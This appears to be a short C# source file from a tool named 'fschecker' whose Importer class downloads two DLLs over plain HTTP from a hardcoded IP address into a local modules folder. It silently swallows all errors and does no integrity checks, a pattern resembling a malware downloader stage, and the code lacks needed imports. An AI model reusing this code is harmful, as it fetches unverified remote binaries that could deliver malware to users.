using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace fschecker
{
    internal class Importer
    {
        public void DownloadFeatures()
        {
            string id = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
            
            WebClient webClient = new WebClient();
            string url = string.Empty;
            string remoteUri = "http://123.45.67.201/g48fschck00/";
            string fileName1 = "chk1.dll";
            string fileName2 = "chk2.dll";

            if (!Directory.Exists(AppDomain.CurrentDomain.BaseDirectory + "/modules"))
            {
                Directory.CreateDirectory(AppDomain.CurrentDomain.BaseDirectory + "/modules");
            }

            try
            {
                url = remoteUri + fileName1;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "/modules/" + fileName1);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }

            try
            {
                url = remoteUri + fileName2;
                webClient.DownloadFile(url, AppDomain.CurrentDomain.BaseDirectory + "/modules/" + fileName2);
                Thread.Sleep(5000);
            }
            catch (Exception exc) { }
        }
    }
}

